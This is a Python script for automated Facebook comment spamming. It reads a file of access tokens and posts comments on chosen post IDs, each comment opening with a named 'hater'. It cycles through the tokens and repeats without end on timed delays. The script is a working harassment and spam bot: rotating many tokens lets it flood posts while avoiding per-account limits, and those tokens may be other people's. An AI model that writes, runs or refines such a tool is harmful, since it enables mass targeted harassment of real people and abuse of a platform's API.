import requests
import time
import sys
import os
from datetime import datetime

# Animation Function (Typewriter Effect)
def animate_text(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Clear screen
os.system('clear')

# Logo with animation
logo = """\x1b[1;36m      
  _          _______    ______     _______    _______    _______      _______    _         _________
 ( (    /|  (  ___  )  (  __  \   (  ____ \  (  ____ \  (       )    (  ___  )  ( \        \__   __/
 |  \  ( |  | (   ) |  | (  \  )  | (    \/  | (    \/  | () () |    | (   ) |  | (           ) (   
 |   \ | |  | (___) |  | |   ) |  | (__      | (__      | || || |    | (___) |  | |           | |   
 | (\ \) |  |  ___  |  | |   | |  |  __)     |  __)     | |(_)| |    |  ___  |  | |           | |   
 | | \   |  | (   ) |  | |   ) |  | (        | (        | |   | |    | (   ) |  | |           | |   
 | )  \  |  | )   ( |  | (__/  )  | (____/\  | (____/\  | )   ( |    | )   ( |  | (____/\  ___) (___
 |/    )_)  |/     \|  (______/   (_______/  (_______/  |/     \|    |/     \|  (_______/  \_______/                                                                                                   
"""

animate_text(logo, 0.001)

# Start time
animate_text("\033[92mSTART TIME : " + time.strftime("%Y-%m-%d %H:%M:%S"))

# Login System
animate_text("\n\033[1;32m<<━━━━━━━━━━━━━━ LOGIN REQUIRED ━━━━━━━━━━━━━━>>\n")
password = input("\033[1;32m𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 ➜  ")
if password != "your_password":
    animate_text("\033[1;31m❌ INCORRECT PASSWORD! EXITING...\n")
    sys.exit()

animate_text("\033[1;32m✅ LOGIN SUCCESSFUL!\n")

# Load Token File
token_file = input("\033[1;30m𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗞𝗘𝗡 𝗙𝗜𝗟𝗘 𝗣𝗔𝗧𝗛 ➜ ")
with open(token_file, 'r') as f:
    access_tokens = f.read().splitlines()

# Number of posts
num_user_ids = int(input("\033[1;32m𝗣𝗢𝗦𝗧𝗦 𝗞𝗜 𝗦𝗔𝗡𝗞𝗛𝗬𝗔 ➜ "))
user_messages = {}
haters_name = {}

# Collecting User IDs & Messages
for i in range(num_user_ids):
    user_id = input(f"\033[1;32m𝗣𝗢𝗦𝗧 𝗜𝗗 {i+1} ➜ ")
    hater_name = input("\033[1;32m𝗛𝗔𝗧𝗘𝗥𝗦 𝗡𝗔𝗠𝗘 ➜ ")
    message_file = input("\033[1;32m𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗜𝗟𝗘 ➜ ")

    haters_name[user_id] = hater_name
    user_messages[user_id] = message_file

# Delay Timings
delay_time = int(input("\033[1;32m𝗗𝗘𝗟𝗔𝗬 (seconds) 𝗕𝗘𝗧𝗪𝗘𝗘𝗡 𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 ➜ "))
repeat_delay = int(input("\033[1;32m𝗗𝗘𝗟𝗔𝗬 (seconds) 𝗕𝗘𝗙𝗢𝗥𝗘 𝗥𝗘𝗣𝗘𝗔𝗧𝗜𝗡𝗚 ➜ "))

# Function to send message
def send_message(access_token, user_id, message, hater_name):
    url = f"https://graph.facebook.com/v15.0/{user_id}/comments"
    headers = {
        'Authorization': f'Bearer {access_token}',
        'User-Agent': 'Mozilla/5.0'
    }
    data = {'message': f'{hater_name} {message}'}

    response = requests.post(url, headers=headers, data=data)
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if response.status_code == 200:
        animate_text(f"\033[1;32m[{current_time}] ✅ Comment Sent to {user_id}: {hater_name} {message}")
        return True
    else:
        animate_text(f"\033[1;31m[{current_time}] ❌ Error sending comment to {user_id}: {response.content.decode()}")
        return False

# Main Loop
while True:
    successful, failed = 0, 0

    for i, access_token in enumerate(access_tokens):
        for user_id, message_file in user_messages.items():
            hater_name = haters_name[user_id]
            with open(message_file, 'r') as f:
                messages = f.read().splitlines()

            message = messages[i % len(messages)]

            if send_message(access_token, user_id, message, hater_name):
                successful += 1
            else:
                failed += 1

            time.sleep(delay_time)

    animate_text(f"\n\033[1;34m✅ {successful} Messages Sent, ❌ {failed} Failed!")
    animate_text(f"\033[1;36m🔁 Waiting {repeat_delay} seconds before next cycle...\n")
    time.sleep(repeat_delay)
